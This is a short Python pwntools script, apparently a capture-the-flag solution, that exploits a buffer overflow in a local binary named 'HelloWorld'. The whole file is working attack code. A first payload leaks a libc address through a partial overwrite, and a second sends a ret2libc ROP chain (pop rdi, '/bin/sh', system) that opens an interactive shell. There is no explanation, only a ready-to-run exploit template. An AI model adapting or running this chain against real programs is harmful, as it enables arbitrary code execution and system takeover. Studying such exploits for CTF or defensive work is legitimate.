#!/usr/bin/env python3


from pwn import *


e = ELF("./HelloWorld")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
r = process("./HelloWorld")
exploit = b"A" * 0x2ec + b"u" + b"A" * 11 + p8(0x89)
r.send(exploit)
leak = u64(r.recvuntil(b"\x7f")[-6:].decode('latin-1').ljust(8,'\x00')) - 0x29d89
exploit = b"A" * 0x2ec + b"u" + b"A" * 11 + p64(leak + pop_rdi) + p64(leak + next(libc.search(b"/bin/sh\x00"))) + p64(leak + pop_rdi + 1) + p64(leak + libc.sym.system)
r.sendafter(b"What is Your Name?",exploit)
r.interactive()
